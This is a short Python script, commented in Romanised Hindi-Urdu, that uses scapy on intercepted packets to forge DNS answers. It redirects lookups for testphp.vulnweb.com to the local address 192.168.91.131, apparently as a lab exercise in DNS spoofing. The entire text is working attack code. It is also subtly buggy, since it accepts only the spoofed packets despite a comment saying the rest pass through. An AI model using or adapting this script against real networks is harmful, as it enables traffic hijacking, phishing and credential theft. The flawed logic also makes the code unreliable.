from scapy.all import IP, DNS, DNSRR, DNSQR, UDP

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    
    if scapy_packet.haslayer(DNSRR): # Agar jawab mil gaya
        qname = scapy_packet[DNSQR].qname
        
        # Jhooth bolne ka waqt!
        if b"testphp.vulnweb.com" in qname:
            print(f"[!] Spoofing target: {qname}")
            
            # 1. Purana answer hatao aur naya banao (Apni IP daalein)
            answer = DNSRR(rrname=qname, rdata="192.168.91.131")
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            
            # 2. Checksum delete karo (Scapy khud naya calculate karega)
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            
            # 3. Modify kiya hua packet queue mein wapas daalo
            packet.set_payload(bytes(scapy_packet))
            
            packet.accept() # Baaki packets ko jaane do